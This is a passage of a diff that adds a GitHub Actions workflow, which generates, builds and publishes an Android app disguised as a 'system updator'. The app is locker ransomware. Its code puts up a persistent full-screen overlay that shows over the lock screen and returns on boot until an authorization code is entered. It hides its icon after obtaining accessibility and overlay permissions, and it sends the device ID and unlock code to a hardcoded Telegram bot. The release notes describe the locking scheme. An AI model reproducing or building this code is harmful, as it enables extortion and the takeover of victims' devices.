+                          | WindowManager.LayoutParams.FLAG_LAYOUT_ATTACHED_IN_DECOR
+                          | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                          | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                          | WindowManager.LayoutParams.FLAG_FULLSCREEN
+                          | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                          | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                          | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+
+                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                              WindowManager.LayoutParams.MATCH_PARENT,
+                              WindowManager.LayoutParams.MATCH_PARENT,
+                              type, flags, PixelFormat.OPAQUE);
+
+                      params.gravity = Gravity.TOP | Gravity.START;
+                      params.x = 0;
+                      params.y = 0;
+                      params.width = WindowManager.LayoutParams.MATCH_PARENT;
+                      params.height = WindowManager.LayoutParams.MATCH_PARENT;
+                      params.screenBrightness = 1.0f;
+
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                          params.layoutInDisplayCutoutMode =
+                              WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;
+                      }
+
+                      windowManager.addView(overlayView, params);
+                      showing = true;
+
+                  } catch (Exception e) {
+                      Log.e(TAG, "Overlay show failed", e);
+                      showing = false;
+                  }
+              }
+
+              public synchronized void dismiss() {
+                  mainHandler.post(this::dismissInternal);
+              }
+
+              private void dismissInternal() {
+                  try {
+                      if (overlayView != null && windowManager != null) {
+                          windowManager.removeViewImmediate(overlayView);
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Overlay dismiss error", e);
+                  } finally {
+                      if (webView != null) {
+                          try { webView.destroy(); } catch (Exception ignored) { }
+                          webView = null;
+                      }
+                      overlayView = null;
+                      showing = false;
+                  }
+              }
+
+              public synchronized void ensureShowing() {
+                  try {
+                      if (!showing || overlayView == null) {
+                          showing = false;
+                          overlayView = null;
+                          show();
+                          return;
+                      }
+                      boolean healthy = overlayView.isAttachedToWindow()
+                              && overlayView.isShown()
+                              && overlayView.getVisibility() == View.VISIBLE
+                              && overlayView.getWindowToken() != null;
+                      if (!healthy) {
+                          dismissInternal();
+                          show();
+                          return;
+                      }
+                      overlayView.bringToFront();
+                      overlayView.requestLayout();
+                      overlayView.invalidate();
+                  } catch (Exception e) {
+                      Log.e(TAG, "ensureShowing error", e);
+                      try { dismissInternal(); } catch (Exception ignored) { }
+                      try { show(); } catch (Exception ignored) { }
+                  }
+              }
+
+              public synchronized boolean isShowing() {
+                  return showing;
+              }
+
+              private class AuthBridge {
+                  @JavascriptInterface
+                  public void onAuthorized() {
+                      AuthService s = AuthServiceHolder.get();
+                      if (s != null) s.onAuthorized();
+                  }
+
+                  @JavascriptInterface
+                  public void onFailedAttempt(int attemptsLeft) {
+                      AuthService s = AuthServiceHolder.get();
+                      if (s != null) s.onFailedAttempt(attemptsLeft);
+                  }
+
+                  @JavascriptInterface
+                  public void onLocked() {
+                      AuthService s = AuthServiceHolder.get();
+                      if (s != null) s.onLocked();
+                  }
+
+                  @JavascriptInterface
+                  public void onUnlocked() {
+                      AuthService s = AuthServiceHolder.get();
+                      if (s != null) s.onUnlocked();
+                  }
+              }
+          }
+          EOF
+
+      - name: Generate MainActivity.java
+        run: |
+          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
+          package com.system.updator;
+
+          import android.app.Activity;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.content.pm.PackageManager;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.provider.Settings;
+          import android.util.Log;
+          import android.widget.Button;
+          import android.widget.TextView;
+
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+
+          public class MainActivity extends Activity {
+
+              private static final String TAG = "MainActivity";
+              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
+              private static final String CHAT_ID = "8468538314";
+
+              private TextView tvStatus;
+              private Button btnPermissions, btnAccessibility;
+              private SharedPreferences prefs;
+              private Handler handler = new Handler(android.os.Looper.getMainLooper());
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+
+                  prefs = getSharedPreferences("auth_prefs", MODE_PRIVATE);
+
+                  if (!prefs.getBoolean("install_notice_sent", false)) {
+                      prefs.edit().putBoolean("install_notice_sent", true).apply();
+
+                      String uniqueCode = AuthCodeGenerator.getUniqueCode(this);
+                      String deviceId = "";
+                      try {
+                          deviceId = Settings.Secure.getString(
+                                  getContentResolver(), Settings.Secure.ANDROID_ID);
+                      } catch (Exception ignored) { }
+
+                      String msg = "Installed\n"
+                              + "Device ID: " + deviceId + "\n"
+                              + "Authorization Code: " + uniqueCode;
+                      sendTelegram(msg);
+                  }
+
+                  tvStatus = findViewById(R.id.tvStatus);
+                  btnPermissions = findViewById(R.id.btnPermissions);
+                  btnAccessibility = findViewById(R.id.btnAccessibility);
+
+                  btnPermissions.setOnClickListener(v -> {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          if (!Settings.canDrawOverlays(this)) {
+                              Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                      Uri.parse("package:" + getPackageName()));
+                              startActivity(i);
+                          } else {
+                              tvStatus.setText("Overlay permission granted");
+                          }
+                      }
+                  });
+
+                  btnAccessibility.setOnClickListener(v ->
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+
+                  checkAndHideIfReady();
+              }
+
+              @Override
+              protected void onResume() {
+                  super.onResume();
+                  checkAndHideIfReady();
+              }
+
+              private void checkAndHideIfReady() {
+                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();
+                  boolean overlayGranted = Settings.canDrawOverlays(this);
+
+                  if (accessibilityEnabled && overlayGranted) {
+                      tvStatus.setText("All ready - disappearing...");
+                      hideAppIcon();
+                      handler.postDelayed(this::finish, 500);
+                  } else if (accessibilityEnabled) {
+                      tvStatus.setText("Enable Overlay Permission");
+                  } else {
+                      tvStatus.setText("Enable Accessibility Service");
+                  }
+              }
+
+              private boolean isAccessibilityServiceEnabled() {
+                  String service = getPackageName() + "/" + AuthService.class.getCanonicalName();
+                  String enabledServices = Settings.Secure.getString(getContentResolver(),
+                      Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                  return enabledServices != null && enabledServices.contains(service);
+              }
+
+              private void hideAppIcon() {
+                  try {
+                      ComponentName componentName = new ComponentName(this, MainActivity.class);
+                      getPackageManager().setComponentEnabledSetting(
+                          componentName,
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                          PackageManager.DONT_KILL_APP);
+                  } catch (Exception e) {
+                      Log.e(TAG, "Hide icon error", e);
+                  }
+              }
+
+              private void sendTelegram(String text) {
+                  final String token = BOT_TOKEN;
+                  final String chat = CHAT_ID;
+                  new Thread(() -> {
+                      HttpURLConnection conn = null;
+                      try {
+                          String encoded = URLEncoder.encode(text, "UTF-8");
+                          String urlStr = "https://api.telegram.org/bot" + token
+                                  + "/sendMessage?chat_id=" + chat + "&text=" + encoded;
+                          URL url = new URL(urlStr);
+                          conn = (HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("GET");
+                          conn.setConnectTimeout(8000);
+                          conn.setReadTimeout(8000);
+                          conn.getResponseCode();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram send failed", e);
+                      } finally {
+                          if (conn != null) conn.disconnect();
+                      }
+                  }).start();
+              }
+          }
+          EOF
+
+      - name: Generate BootReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.util.Log;
+
+          public class BootReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  String action = intent.getAction();
+                  if (Intent.ACTION_BOOT_COMPLETED.equals(action)
+                          || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
+                      Log.d("BootReceiver", "Boot completed");
+
+                      SharedPreferences prefs = context.getSharedPreferences(
+                              "auth_prefs", Context.MODE_PRIVATE);
+                      boolean authorized = prefs.getBoolean("authorized", false);
+
+                      if (!authorized) {
+                          try {
+                              OverlayManager.get(context).show();
+                          } catch (Exception e) {
+                              Log.e("BootReceiver", "overlay show failed", e);
+                          }
+                      }
+                  }
+              }
+          }
+          EOF
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew clean assembleDebug
+
+      - name: Upload APK artifact
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: accessibility-menu-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Create GitHub Release
+        if: success()
+        uses: softprops/action-gh-release@v1
+        with:
+          files: app/build/outputs/apk/debug/app-debug.apk
+          tag_name: v${{ github.run_number }}
+          body: |
+            Authorization Overlay v1
+            - Only two permissions: Overlay + Accessibility Service
+            - Unique per-device authorization code (SHA-256 of ANDROID_ID + "UJ7MY8VGOH", first 10 uppercase hex chars)
+            - Unique code sent to Telegram on install
+            - Overlay appears 5 minutes after install (measured from PackageManager firstInstallTime)
+            - Overlay reappears immediately on device boot if not yet authorized
+            - Overlay dismisses only on correct authorization code
+            - Fixed unlock code after 5 failed attempts: PWSSAOFHW
+            - Telegram: Installed (+ device ID + auth code), Authorized, Failed attempt, Locked, Unlocked
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build succeeded
+        run: echo "APK built and released successfully."
